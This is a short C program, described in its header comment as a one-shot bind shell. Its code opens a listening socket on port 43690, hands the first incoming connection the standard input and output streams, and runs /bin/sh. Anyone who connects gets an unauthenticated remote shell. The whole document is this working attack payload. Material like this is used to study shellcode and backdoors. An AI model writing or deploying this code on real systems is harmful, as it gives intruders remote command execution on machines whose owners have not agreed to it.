/*
 * One shot bind shell. Does not loop, will not print
 * anything out when connected (so just start typing)
 *
 */

#include <sys/socket.h>
#include <netinet/in.h>

int main()
{
	char * shell[2];
	int server, client;
	struct sockaddr_in serv_addr;

	server = socket( 2, 1, 0 );
	serv_addr.sin_addr.s_addr = 0;
	serv_addr.sin_port = 0xAAAA;	// 43690
	serv_addr.sin_family = 2;

	bind( server,(struct sockaddr *)&serv_addr, 0x10);
	listen(server, 0);

	client = accept( server, 0, 0 );
	dup2( client, 0 );
	dup2( client, 1 );
	dup2( client, 2 );
	shell[0] = "/bin/sh";
	shell[1] = 0;
	execve(shell[0], 0, 0 );
}
